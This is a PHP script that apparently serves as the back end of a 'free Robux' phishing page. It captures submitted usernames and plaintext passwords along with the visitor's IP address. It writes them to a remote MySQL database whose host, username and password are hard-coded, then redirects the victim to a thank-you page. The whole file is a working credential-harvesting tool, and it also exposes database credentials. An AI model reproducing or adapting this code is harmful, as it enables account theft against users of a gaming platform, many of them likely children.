<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }

    $dbHost = "54.38.50.59";
    $dbUsername = "www13542_freebobux"; 
    $dbPassword = "CsDCddd9EfrmdoEbowR4"; 
    $dbName = "www13542_freebobux"; 

    $conn = new mysqli($dbHost, $dbUsername, $dbPassword, $dbName);

    if ($conn->connect_error) {
        die("Błąd połączenia z bazą danych: " . $conn->connect_error);
    }

    $sql = "INSERT INTO logins (username, password, ip_address) VALUES (?, ?, ?)";
    $stmt = $conn->prepare($sql);

    $stmt->bind_param("sss", $username, $password, $ip_address);

    if ($stmt->execute()) {
        echo "Dane logowania zostały zapisane w bazie danych.";
    } else {
        echo "Wystąpił błąd podczas zapisywania danych w bazie danych: " . $stmt->error;
    }
    $stmt->close();
    $conn->close();
    header("Location: thanks.html");
    exit(); 
}

?>
